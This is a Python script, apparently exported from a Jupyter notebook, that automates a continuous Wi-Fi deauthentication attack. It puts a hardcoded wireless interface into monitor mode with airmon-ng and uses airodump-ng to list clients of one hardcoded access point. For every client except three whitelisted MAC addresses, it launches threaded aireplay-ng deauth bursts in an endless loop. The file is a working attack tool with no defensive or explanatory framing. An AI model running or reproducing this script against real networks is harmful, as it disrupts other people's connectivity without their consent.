#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import csv
import subprocess
import random
import threading
import time
from os.path import exists

#pa = input("Output Path : ")
bssid = "E0:63:DA:BD:F4:23"

fileNum = input('File Number : ')
#fileName = f"Deauther{fileNum}"
fileName = f"Deauther"
if not exists(fileName):
	subprocess.call(["mkdir",fileName])

csvFilename = f"client{fileNum}"
path = f"{fileName}/{csvFilename}"
interface = "wlx2887baafa69e"
delay = 60

ignore = [
    'C2:25:2F:09:9E:0E',
    '64:DD:E9:D8:23:A9',
    'E0:1F:88:F9:91:3F'
]

def kill(interface):
    subprocess.call(["airmon-ng","check","kill"])

    subprocess.call(["airmon-ng","start",interface])

def createFile(delay,interface,bssid,path):
    subprocess.call(["rm",f"{fileName}/client{fileNum}-01.csv"])

    subprocess.call(["timeout","--foreground",f"{delay}s","airodump-ng",interface,"--bssid",bssid,"-w",path,"-o","csv"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

def deauth(interface,channel,bssid,station,pkg):
    subprocess.call(["airmon-ng","start",interface,f"{channel}"],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    subprocess.call(["aireplay-ng","-0",f"{pkg}","-a",bssid,"-c",station,interface],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
def readFile():
    lis = []
    with open(f"{fileName}/client{fileNum}-01.csv",newline='') as csvFile:
        reader = csv.reader(csvFile)
        for i in reader:
            lis.append(i)

    lis1 = lis[4:]
    lisOfstation = []
    for i in lis1[1:]:
        if i == []:
            pass
        else:
            lisOfstation.append(i[0])
    channel = int(lis[2][3])
    return lisOfstation,channel
def threadDeauth(interface,channel,bssid,station,pkg):
    thread = threading.Thread(target=deauth,args=(interface,channel,bssid,station,pkg))
    thread.deamon = True
    thread.start()
    
sta = input("Did u start Moniter Mode?(y or n): ")
if sta == 'y':
    pass
else:
    kill(interface)

while 1:
    print()
    print("Let Start...")
    t1 = time.time()
    createFile(delay,interface,bssid,path)
    t2 = time.time()
    totalTime = t2 - t1
    print(f"Takin File Duration {int(totalTime)}s")
    lisOfstation,channel = readFile()
    #print(lisOfstation)

    # for station in lisOfstation:
    #     if station in ignore:
    #         lisOfstation.remove(station)

    for station in lisOfstation:
        if station in ignore:
            continue
        pkg = random.randint(100,150)
        print(f"Start Attack To {station}.")
        threadDeauth(interface,channel,bssid,station,pkg)

    time.sleep(12*len(lisOfstation))
# In[ ]:



